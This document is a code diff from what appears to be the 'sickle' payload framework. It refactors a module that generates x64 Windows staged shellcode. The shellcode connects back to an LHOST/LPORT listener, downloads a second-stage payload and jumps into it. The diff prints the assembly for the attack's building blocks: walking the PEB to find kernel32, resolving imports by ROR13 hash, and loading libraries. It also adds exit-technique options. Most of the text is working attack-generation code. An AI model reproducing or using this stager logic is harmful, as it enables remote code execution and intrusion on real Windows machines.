@@ -7,12 +7,12 @@ from sickle.common.lib.generic import extract
 from sickle.common.lib.generic import convert
 from sickle.common.lib.generic import modparser
 from sickle.common.lib.programmer import builder
+from sickle.common.lib.programmer import stubhub
 
 from sickle.common.lib.reversing.assembler import Assembler
 
 from sickle.common.headers.windows import (
     winnt,
-    ntdef,
     ws2def,
     winternl
 )
@@ -57,6 +57,19 @@ class Shellcode():
     arguments["LPORT"]["optional"] = "yes"
     arguments["LPORT"]["description"] = "Listening port on listener host"
 
+    advanced = {}
+    advanced["OP_AS_FUNC"] = {}
+    advanced["OP_AS_FUNC"]["optional"] = "yes"
+    advanced["OP_AS_FUNC"]["description"] = "Generate shellcode that operates as function"
+
+    advanced["EXITFUNC"] = {}
+    advanced["EXITFUNC"]["optional"] = "yes"
+    advanced["EXITFUNC"]["description"] = "Exit technique"
+
+    advanced["EXITFUNC"]["options"] = { "terminate": "Terminates the process and all of its threads",
+                                        "thread": "Exit as a thread",
+                                        "process": "Exit as a process" }
+
     def __init__(self, arg_object):
 
         self.arg_list = arg_object["positional arguments"]
@@ -74,6 +87,8 @@ class Shellcode():
             ],
         }
 
+        self.set_args()
+
         sc_args = builder.init_sc_args(self.dependencies)
         sc_args.update({
             "wsaData"                       : 0x00,
@@ -89,176 +104,37 @@ class Shellcode():
 
         return
 
-    def get_kernel32(self):
-        """Generates stub for obtaining the base address of Kernel32.dll
-        """
-
-        stub = f"""
-getKernel32:
-    mov dl, 0x4b
-getPEB:
-    mov rcx, 0x60
-    mov r8, gs:[rcx]
-getHeadEntry:
-    mov rdi, [r8 + {winternl._PEB.Ldr.offset}]
-    mov rdi, [rdi + {winternl._PEB_LDR_DATA.InLoadOrderModuleList.offset}]
-search:
-    xor rcx, rcx
-    mov rax, [rdi + {winternl._LDR_DATA_TABLE_ENTRY.DllBase.offset}]
-    mov rsi, [rdi + {winternl._LDR_DATA_TABLE_ENTRY.BaseDllName.offset + ntdef._UNICODE_STRING.Buffer.offset}]
-    mov rdi, [rdi]
-    cmp [rsi + 0x18], cx
-    jne search
-    cmp [rsi], dl
-    jne search
-found:
-    ret
-        """
-
-        return stub
-
-    def lookup_function(self):
-        """Generates the stub responsible for obtaining the base address of a function
-        """
-
-        stub = f"""
-lookupFunction:
-    push rbp
-    mov rbp, rsp
-    mov ebx, [rdi + {winnt._IMAGE_DOS_HEADER.e_lfanew.offset}]
-    add rbx, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset + winnt._IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
-    add rbx, rdi
-    mov eax, [rbx]
-    mov rbx, rdi
-    add rbx, rax
-    mov eax, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfFunctions.offset}]
-    mov r8, rdi
-    add r8, rax
-    mov rcx, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
-parseNames:
-    jecxz error
-    dec ecx
-    mov eax, [r8 + rcx * 4]
-    mov rsi, rdi
-    add rsi, rax
-    xor r9, r9
-    xor rax, rax
-    cld
-calcHash:
-    lodsb
-    test al, al
-    jz calcDone
-    ror r9d, 0xD
-    add r9, rax
-    jmp calcHash
-calcDone:
-    cmp r9d, edx
-    jnz parseNames
-findAddress:
-    mov r8d, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}]
-    add r8, rdi
-    xor rax, rax
-    mov ax, [r8 + rcx * 2]
-    mov r8d, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}]
-    add r8, rdi
-    mov eax, [r8 + rax * 4]
-    add rax, rdi
-error:
-    leave
-    ret
-        """
-
-        return stub
-
-    def load_library(self, lib):
-        """Generates the stub to load a library not currently loaded into a process
-        """
-
-        lists = convert.from_str_to_xwords(lib)
-        write_index = self.storage_offsets['functionName']
-
-        src = "\nload_library_{}:\n".format(lib.rstrip(".dll"))
-
-        for i in range(len(lists["QWORD_LIST"])):
-            src += "    mov rcx, 0x{}\n".format( struct.pack('<Q', lists["QWORD_LIST"][i]).hex() )
-            src += "    mov [rbp-{}], rcx\n".format(hex(write_index))
-            write_index -= 8
-
-        for i in range(len(lists["DWORD_LIST"])):
-            src += "    mov ecx, dword 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() ) 
-            src += "    mov [rbp-{}], ecx\n".format(hex(write_index))
-            write_index -= 4
-
-        for i in range(len(lists["WORD_LIST"])):
-            src += "    mov cx, 0x{}\n".format( struct.pack('<H', lists["WORD_LIST"][i]).hex() )
-            src += "    mov [rbp-{}], cx\n".format(hex(write_index))
-            write_index -= 2
-
-        for i in range(len(lists["BYTE_LIST"])):
-            src += "    mov cl, {}\n".format( hex(lists["BYTE_LIST"][i]) )
-            src += "    mov [rbp-{}], cl\n".format(hex(write_index))
-            write_index -= 1
-
-        src += f"""
-    xor rcx, rcx
-    mov [rbp-{write_index}], cl
-    lea rcx, [rbp - {self.storage_offsets['functionName']}]
-    mov rax, [rbp - {self.storage_offsets['LoadLibraryA']}]
-    call rax
-        """
-
-        return src
-
-    def resolve_functions(self):
-        """This function is responsible for loading all libraries and resolving respective functions
-        """
-
-        stub = ""
-        for lib, imports in self.dependencies.items():
-            if (lib != "Kernel32.dll"):
-                stub += self.load_library(lib)
-                stub += """
-    mov rdi, rax
-                """
-
-            for func in range(len(imports)):
-                stub += f"""
-get_{imports[func]}:
-    mov rdx, {convert.from_str_to_win_hash(imports[func])}
-    call lookupFunction
-    mov [rbp - {self.storage_offsets[imports[func]]}], rax
-                """
-
-        return stub
-
-    def generate_source(self):
-        """Returns bytecode generated by the keystone engine.
-        """
+    def set_args(self):
 
         argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
         if (argv_dict == None):
             exit(-1)
 
         if ("LPORT" not in argv_dict.keys()):
-            lport = 4444
+            self.lport = 4444
         else:
-            lport = int(argv_dict["LPORT"])
+            self.lport = int(argv_dict["LPORT"])
 
-        sin_addr = hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))
-        sin_port = struct.pack('<H', lport).hex()
-        sin_family = struct.pack('>H', ws2def.AF_INET).hex()
+        self.lhost = argv_dict['LHOST']
 
-        shellcode = f"""
-_start:
-    push rbp
-    mov rbp, rsp
-    sub rsp, {self.stack_space}
+        return 0
 
-    call getKernel32
-    mov rdi, rax
+    def generate_source(self):
+        """Returns bytecode generated by the keystone engine.
         """
 
-        shellcode += self.resolve_functions()
+        win_stubs = stubhub.WinRawr(self.storage_offsets,
+                                    self.dependencies,
+                                    self.stack_space,
+                                    False,
+                                    "")
+
+        shellcode = win_stubs.get_prologue()
+        shellcode += win_stubs.get_resolver()
+
+        sin_port = struct.pack('<H', self.lport).hex()
+        sin_family = struct.pack('>H', ws2def.AF_INET).hex()
+        sin_addr = hex(convert.ip_str_to_inet_addr(self.lhost))
 
         shellcode += f"""
 call_WSAStartup:
@@ -324,9 +200,9 @@ download_complete:
     jmp [rbp - {self.storage_offsets['lpvShellcode']}]
         """
 
-        shellcode += self.get_kernel32()
+        shellcode += win_stubs.get_kernel32_stub()
 
-        shellcode += self.lookup_function()
+        shellcode += win_stubs.get_lookup_stub()
 
         return shellcode
 
